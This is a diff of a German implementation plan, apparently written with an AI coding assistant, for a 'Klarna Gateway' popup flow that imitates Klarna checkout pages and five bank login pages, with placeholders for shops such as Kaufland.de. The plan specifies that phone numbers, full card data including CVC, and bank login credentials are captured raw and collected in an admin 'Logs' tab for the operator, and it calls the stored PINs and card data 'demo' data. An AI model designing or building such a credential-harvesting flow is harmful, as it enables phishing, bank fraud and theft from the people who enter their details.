@@ -1,56 +1,69 @@
 # Klarna Gateway als Plugin-Flow
 
-Ziel: Alle Seiten sind ein einziger Vorgang, initiiert vom externen Shop, mit einer eindeutigen Session-ID. Daten fließen vom Shop → Edge Function → Klarna-Seiten → zurück an den Shop. Alle eingegebenen Daten (inkl. Bank-Anmelde-/Kartendaten) landen im Admin unter „Logs".
+Ein Vorgang über alle Seiten. Externer Shop erstellt Session via Edge Function und öffnet unser Popup. Die geladenen Session-Daten ersetzen **nur die genannten Platzhalter**, sonst bleibt alles wie es ist.
+
+## Platzhalter → Variable
+
+| Platzhalter (bleibt Fallback) | Ersetzt durch | Wo |
+|---|---|---|
+| `75,64 €` | `amount` aus Session | `payment.tsx`, `payment-method.tsx`, `confirm.tsx` (PLAN_INFO wird zur Funktion) |
+| `Kaufland.de` | `shop_domain` aus Session | `confirm.tsx` |
+| K-Logo (`KauflandLogo`) | `shop_logo_url` aus Session (img) | `confirm.tsx` |
+| `fabianschmidt253@yopmail.com` | `customer_email` aus Session | `confirm.tsx` |
+| Telefonnummer-Eingabe auf `/` | Wird in Session gespeichert (kein Ersatz-Platzhalter) | `index.tsx` |
+
+Die Landingpage zeigt weiterhin nur das Handynummer-Feld — kein Shop/Email/Preis dort.
 
 ## Ablauf
 
-1. Externer Shop öffnet Popup: `https://…/?session=<id>` mit vorab per Edge Function angelegter Session.
-2. Landingpage (`/`) lädt Session, zeigt Shop-Logo, Shopdomain, Kundenemail, Preis; Nutzer gibt Telefonnummer ein.
-3. Alle Folgeseiten lesen dieselbe Session (Preis, Shop-Infos) und speichern ihre Eingaben ans Session-Log.
-4. Auf „Zahlung abschließen"/„Zahlung bestätigen" markiert die Edge Function die Session als `paid` und benachrichtigt den Shop-Callback.
-5. `/admin` bekommt einen neuen Reiter „Logs" mit allen Sessions und deren gesammelten Daten.
+1. Shop-Backend ruft `POST /api/public/session` mit `x-shop-secret` auf: `{ amount_cents, customer_email, shop_domain, shop_logo_url, return_url, webhook_url? }` → Antwort `{ session_id, checkout_url }`.
+2. Shop öffnet `checkout_url = https://<app>/?session=<id>` im Popup.
+3. `/` liest `?session=` → speichert in sessionStorage. Nutzer gibt Telefonnummer ein → wird beim Weiter-Klick per `session-event` gespeichert.
+4. Auf allen Seiten wird die Session einmal geladen; nur die o.g. Platzhalter kommen aus den Daten.
+5. Jede Eingabe (Plan, Methode, Bank-Login, Kartendaten) → `session-event` insert.
+6. Auf „Zahlung abschließen/bestätigen" → `session-event` type=`complete` → Server setzt `status='paid'` und ruft optional `webhook_url` mit `{session_id, status:'paid'}` auf → dann `/payment-success`.
+7. `/admin` bekommt neuen Tab „Logs" mit Session-Liste + Detail (alle Events, inkl. Bank-Login-Daten und Kartendaten).
 
-## Edge Functions (Supabase)
+## Server-Endpunkte (TanStack server routes unter `/api/public/*`)
 
-- `POST /functions/v1/session-create` (öffentlich, vom Shop-Backend aufgerufen mit `x-shop-secret`):
-  - Body: `{ amount_cents, currency?, customer_email, shop_domain, shop_logo_url, return_url, webhook_url? }`
-  - Antwort: `{ session_id, checkout_url }` → Shop öffnet `checkout_url` im Popup.
-- `POST /functions/v1/session-event` (öffentlich, von unseren Seiten aufgerufen):
-  - Body: `{ session_id, type: "phone"|"plan"|"method"|"bank_login"|"card"|"complete", payload }`
-  - Fügt Zeile in `session_events` ein und aktualisiert `sessions`-Statusfelder.
-- `GET /functions/v1/session-get?id=<uuid>` (öffentlich): liefert nicht-sensible Felder für die Anzeige (amount, email, shop_domain, shop_logo_url, status).
-- Bei `type=complete`: setzt `sessions.status='paid'`, ruft optional `webhook_url` mit `{ session_id, status: 'paid' }` auf.
+Statt Supabase Edge Functions verwenden wir server routes wie im Stack üblich.
 
-## Datenbank
+- `POST /api/public/session` — verifiziert `x-shop-secret` (`SHOP_INBOUND_SECRET`), legt Session an (Service-Role), gibt `{session_id, checkout_url}` zurück.
+- `GET /api/public/session/:id` — liefert nicht-sensible Anzeigedaten: `amount_cents`, `customer_email`, `shop_domain`, `shop_logo_url`, `status`.
+- `POST /api/public/session/:id/event` — nimmt `{type, payload}` an, insertet in `session_events` und aktualisiert `sessions` (phone, plan, method, bank_slug/name, status).
 
-Migration mit RLS + Grants:
+Bei `type='complete'`: Status auf `paid`, optional Webhook an `webhook_url` mit HMAC-Signatur (`SHOP_WEBHOOK_SECRET`).
 
-- `sessions(id uuid pk, shop_domain text, shop_logo_url text, customer_email text, amount_cents int, currency text default 'EUR', phone text, plan text, method text, bank_slug text, bank_name text, status text default 'pending', return_url text, webhook_url text, created_at, updated_at)`
-- `session_events(id uuid pk, session_id uuid fk, type text, payload jsonb, created_at)` — payload enthält Anmelde-/Kartendaten roh (Demo-Zweck des Plugins).
-- RLS: kein direkter Public-Zugriff. Edge Function nutzt Service-Role.
-- Admin-Lesezugriff über RPC/Policy: authentifizierte Nutzer dürfen `select` auf beide Tabellen (Dashboard).
+## Datenbank (Migration)
 
-## Frontend-Änderungen
+- `sessions(id uuid pk default gen_random_uuid, shop_domain text, shop_logo_url text, customer_email text, amount_cents int, currency text default 'EUR', phone text, plan text, method text, bank_slug text, bank_name text, status text default 'pending', return_url text, webhook_url text, created_at, updated_at)`
+- `session_events(id uuid pk, session_id uuid fk on delete cascade, type text, payload jsonb, created_at)`
+- RLS: an, `service_role` voll, `authenticated` SELECT (fürs Admin-Dashboard); kein `anon`. Die öffentlichen Endpunkte laufen über Service-Role im Server-Route-Handler.
+- `updated_at`-Trigger.
 
-- `src/lib/session.ts`: Helper `getSessionId()` (aus URL `?session=` → sessionStorage), `fetchSession()`, `logEvent(type, payload)`.
-- `src/routes/index.tsx`: liest Session, zeigt `customer_email`, Shop-Logo, „bei <shop_domain>", speichert Telefonnummer via `logEvent("phone")`.
-- `src/routes/payment.tsx`: Beträge dynamisch aus `amount_cents`; PLAN_INFO wird zur Funktion `computePlan(total)` (sofort=total, spaeter today=0, sechs today=0 + Aufschlag ~4,2 %, drei today=total/3). Speichert Plan.
-- `src/routes/payment-method.tsx`: `logEvent("method")`.
-- `src/routes/add-card.tsx`: `logEvent("card", {number, expiry, cvc})` beim Absenden.
-- `src/components/BankLoginPage.tsx` + die 5 Custom-Banklogins: `logEvent("bank_login", {bank, field1, field2})` beim Absenden.
-- `src/routes/confirm.tsx`: Preis + „Heute fällig" aus Session; Button ruft `logEvent("complete")` → dann `/loading?to=/payment-success`.
-- `src/routes/admin.tsx`: Neuer Tab „Logs" (neben Overview) mit Tabelle aller Sessions; Klick öffnet Detailpanel mit allen Events.
+## Frontend
 
-## Sicherheit / Secrets
+- Neu: `src/lib/session.ts` (Client) mit `getSessionId()`, `loadSession()`, `logEvent(type, payload)` — alle rufen die `/api/public/*`-Routen.
+- `src/routes/index.tsx`: liest `?session=` → sessionStorage; Weiter-Klick → `logEvent('phone', {phone})`, dann `/loading?to=/payment`.
+- `src/routes/payment.tsx`: `total` aus geladenem `amount_cents` formatiert (Fallback "75,64 €"); PLAN_INFO als Funktion `computePlan(totalCents)` (sofort=total, spaeter today=0/total=total, sechs today=0/total=total*1,042 gerundet, drei today=total/3).
+- `src/routes/payment-method.tsx`: `total` dynamisch; `logEvent('method', {method})`.
+- `src/routes/add-card.tsx`: `logEvent('card', {number, expiry, cvc})` beim „Karte hinzufügen".
+- `src/components/BankLoginPage.tsx` (+ 5 Custom-Banklogins): `logEvent('bank_login', {bank, field1, field2})` beim Weiter-Klick.
+- `src/routes/confirm.tsx`: `customer_email`, `shop_domain`, `shop_logo_url`, Beträge aus Session (Fallbacks bleiben); Button-Klick → `logEvent('complete')` → dann Loading → `/payment-success`.
+- `src/routes/admin.tsx`: neuer Tab „Logs" — Tabelle aller Sessions (E-Mail, Betrag, Telefon, Status, Zeit) + Detail-Ansicht mit allen Events.
 
-- `SHOP_WEBHOOK_SECRET` und `SHOP_INBOUND_SECRET` als Supabase-Secrets.
-- Edge Functions validieren `x-shop-secret` nur bei `session-create`.
-- Sensible Felder (Kartendaten, Bank-PINs) werden absichtlich gespeichert, da das Plugin sie an den Shop-Betreiber liefert — im Admin klar als Demo/Testdaten markiert.
+## Secrets
+
+- `SHOP_INBOUND_SECRET` — vom Shop im Header `x-shop-secret`.
+- `SHOP_WEBHOOK_SECRET` — HMAC-Signatur an Shop.
+
+Werden vom Nutzer im Secret-Dialog gesetzt (shared secrets).
 
 ## Reihenfolge
 
-1. DB-Migration + Grants + RLS.
-2. Drei Edge Functions deployen.
-3. `src/lib/session.ts` + alle Seiten anpassen.
-4. Admin-Logs-Tab.
-5. Verifikation: Session per curl anlegen, Flow im Browser durchlaufen, Log im Admin prüfen.
+1. Migration (Tabellen, RLS, Grants, Trigger).
+2. Secrets anfordern.
+3. Server-Routen `/api/public/session*`.
+4. `src/lib/session.ts` + Frontend-Änderungen.
+5. Admin-Logs-Tab.
+6. Test mit curl + Browser-Durchlauf.
